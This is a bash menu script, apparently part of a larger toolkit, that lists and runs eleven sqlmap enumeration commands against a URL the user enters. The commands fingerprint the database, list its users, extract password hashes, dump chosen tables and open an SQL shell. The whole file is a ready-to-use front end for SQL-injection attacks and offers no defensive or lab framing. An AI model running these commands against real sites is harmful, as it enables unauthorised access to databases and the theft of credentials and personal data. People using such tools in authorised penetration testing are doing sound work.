#!/usr/bin/env bash

set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/common.sh"

cat <<'EOF'
Enumeration Query
Enumeration Command

1. DBMS banner
sqlmap -u [url] --banner --batch
2. Current user
sqlmap -u [url] --current-user --batch
3. Current database
sqlmap -u [url] --current-db --batch
4. Hostname
sqlmap -u [url] --hostname --batch
5. Users
sqlmap -u [url] --users --batch
6. Password hashes
sqlmap -u [url] --passwords --batch
7. DBs
sqlmap -u [url] --dbs --batch
8. Tables
sqlmap -u [url] --tables -D [db] --batch
9. Columns
sqlmap -u [url] --columns -D [db] -T [table] --batch
10. Dump
sqlmap -u [url] --dump -D [db] -T [table] --batch
11. SQL shell
sqlmap -u [url] --sql-shell --batch
EOF

read -r -p $'\nSelect-Options>Sqlmap>Enumeration>' select

case "$select" in
  1)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --banner --batch
    ;;
  2)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --current-user --batch
    ;;
  3)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --current-db --batch
    ;;
  4)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --hostname --batch
    ;;
  5)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --users --batch
    ;;
  6)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --passwords --batch
    ;;
  7)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --dbs --batch
    ;;
  8)
    read -r -p "Input URL> " url
    read -r -p "Input DB name> " db
    run_sqlmap sqlmap -u "$url" --tables -D "$db" --batch
    ;;
  9)
    read -r -p "Input URL> " url
    read -r -p "Input DB name> " db
    read -r -p "Input table name> " table
    run_sqlmap sqlmap -u "$url" --columns -D "$db" -T "$table" --batch
    ;;
  10)
    read -r -p "Input URL> " url
    read -r -p "Input DB name> " db
    read -r -p "Input table name> " table
    run_sqlmap sqlmap -u "$url" --dump -D "$db" -T "$table" --batch
    ;;
  11)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --sql-shell --batch
    ;;
  *)
    echo "Selected command is not available."
    ;;
esac
